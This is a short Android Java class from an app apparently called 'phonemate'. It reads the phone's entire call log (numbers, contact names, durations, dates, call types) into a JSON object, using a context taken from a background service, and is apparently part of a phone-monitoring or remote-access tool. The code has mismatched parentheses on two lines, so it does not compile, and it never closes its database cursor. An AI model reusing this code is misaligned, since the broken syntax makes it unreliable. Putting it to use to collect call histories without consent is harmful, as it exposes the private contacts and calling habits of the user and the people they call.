package com.dextrotechnologies.phonemate;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallMan {
    public static JSONObject getCallsLogs(){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                int colIndex1, colIndex2, colIndex3, colIndex4, colIndex5;

                colIndex1 = cur.getColumnIndex(CallLog.Calls.NUMBER);
                String num = cur.getString(colIndex1);

                colIndex2 = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                String name = cur.getString(colIndex2);

                colIndex3 = cur.getColumnIndex(CallLog.Calls.DURATION);
                String duration = cur.getString(colIndex3);

                colIndex4 = cur.getColumnIndex(CallLog.Calls.DATE);
                String date = cur.getString(colIndex4);

                colIndex5 = cur.getColumnIndex(CallLog.Calls.TYPE));
                int type = Integer.parseInt(cur.getString(colIndex5);


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("date", date);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }
}
